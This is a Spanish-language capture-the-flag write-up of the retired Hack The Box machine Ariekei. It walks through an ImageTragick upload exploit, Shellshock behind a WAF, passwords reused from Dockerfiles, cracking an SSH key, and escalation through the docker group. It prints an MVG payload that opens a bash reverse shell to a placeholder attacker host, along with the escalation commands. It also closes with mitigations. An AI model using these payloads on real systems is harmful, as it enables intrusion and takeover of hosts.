---
machine: Ariekei
os: Linux
difficulty: Insane
platform: Hack The Box
state: Retired
tags: [linux, web, shellshock, imagemagick, docker, privesc]
---

# Ariekei — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Dos vhosts esconden un blog con Shellshock bloqueado por WAF y un conversor de imágenes vulnerable a ImageTragick. La subida de un MVG da root en un contenedor; los Dockerfiles montados revelan contraseñas reutilizadas y permiten saltar a otro contenedor sin WAF, explotar Shellshock y llegar a la host. La clave SSH de `spanishdancer` se crackea y el grupo `docker` da root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,443 <IP>
```

- `443` presenta un certificado con los SAN `calvin.ariekei.htb` y `beehive.ariekei.htb`.
- `wfuzz` con `Host: FUZZ.ariekei.htb` confirma ambos vhosts.
- `beehive` sirve un blog y `calvin` un conversor de imágenes.

## Enumeración

- `feroxbuster` encuentra `/blog/`, `/cgi-bin/stats` y `/upload`.
- `cgi-bin/stats` ejecuta un CGI en Bash 4.2.37, vulnerable a Shellshock.
- El WAF de `beehive` bloquea el payload de Shellshock con un 403.
- `calvin` no tiene ese WAF en `/upload`.

## Foothold

ImageMagick procesa la subida y es vulnerable a ImageTragick (CVE-2016-3714). Un archivo MVG con una URL maliciosa ejecuta el comando al convertir la imagen.

```text
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/a.jpg"|bash -i >& /dev/tcp/<ATTACKER>/443 0>&1;echo "x)'
pop graphic-context
```

La shell resultante es `root` dentro de un contenedor llamado `calvin`.

## Movimiento lateral

`/common` está montado desde la host e incluye los Dockerfiles y scripts de los contenedores. El Dockerfile de `blog-test` contiene la contraseña de root y la de `bastion-live`. Con esas credenciales se entra por SSH al contenedor `bastion`, que puede hablar con el CGI sin pasar por el WAF.

```bash
cat /common/*/Dockerfile
ssh root@<CONTAINER_IP>
```

## Escalada de privilegios

Desde `bastion` se explota Shellshock en el CGI interno para obtener `www-data` en `blog-test`; la misma contraseña de root del Dockerfile permite ser root allí. El flag de usuario está en `/home/spanishdancer`; su clave SSH se crackea con `ssh2john` y Hashcat, y `spanishdancer` pertenece al grupo `docker`.

```bash
ssh2john id_rsa > key.hash
hashcat -m 22921 key.hash rockyou.txt
docker run -v /:/mnt -it bash bash
```

Dentro del contenedor, `/mnt` es el filesystem de Ariekei; se puede leer `/mnt/root/root.txt` o añadir una regla a `/mnt/etc/sudoers`.

## Evidencia

- Vhosts `beehive` y `calvin` con WAF distinto.
- Shellshock bloqueado en el vhost público.
- MVG de ImageTragick y root en el contenedor.
- Dockerfiles con contraseñas reutilizadas.
- Shellshock interno, clave SSH crackeada y grupo `docker`.

## Lecciones aprendidas

- Un WAF en un vhost no protege el mismo servicio en la red interna.
- Los Dockerfiles y scripts de build suelen contener secretos.
- ImageTragick sigue apareciendo en conversores de imágenes antiguos.
- El grupo `docker` equivale a root en la host.

## Mitigación y detección

- Actualizar Bash e ImageMagick; bloquear MVG/SVG en uploads.
- No guardar contraseñas en Dockerfiles ni montar el código de build en producción.
- Sacar a los usuarios del grupo `docker` y aplicar `no-new-privileges`.
- Monitorizar peticiones con `() { :;};` y procesos `bash` hijos del CGI.

## Referencias

- [0xdf — Ariekei](https://0xdf.gitlab.io/2022/04/20/htb-ariekei.html)
- [IppSec — Ariekei](https://www.youtube.com/watch?v=Pc4tzsn-ats)
- [Hack The Box — Ariekei](https://app.hackthebox.com/machines/ariekei)
